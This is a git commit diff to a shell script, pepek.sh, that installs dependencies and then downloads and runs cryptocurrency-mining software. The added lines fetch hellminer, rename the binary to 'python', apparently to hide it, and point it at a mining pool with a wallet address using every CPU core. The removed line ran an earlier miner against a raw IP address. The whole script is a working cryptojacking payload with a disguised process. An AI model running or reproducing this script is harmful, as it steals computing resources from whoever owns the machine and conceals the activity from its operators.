6b899b48c0fec6f03db7fdeb502af4488b31e02d
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-04 06:52:12 +0700

    Update pepek.sh

--- pepek.sh
+++ pepek.sh
@@ -1,2 +1,5 @@
 apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t 3
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xhf hellminer_linux64.tar.gz
+mv hellminer python
+./python -c stratum+tcp://na.luckpool.net:3956 -u RE9ZxBCB3QiXCbjB8erhFVAC4Ph6ZTNqTE.car -p x -t$(nproc --all)
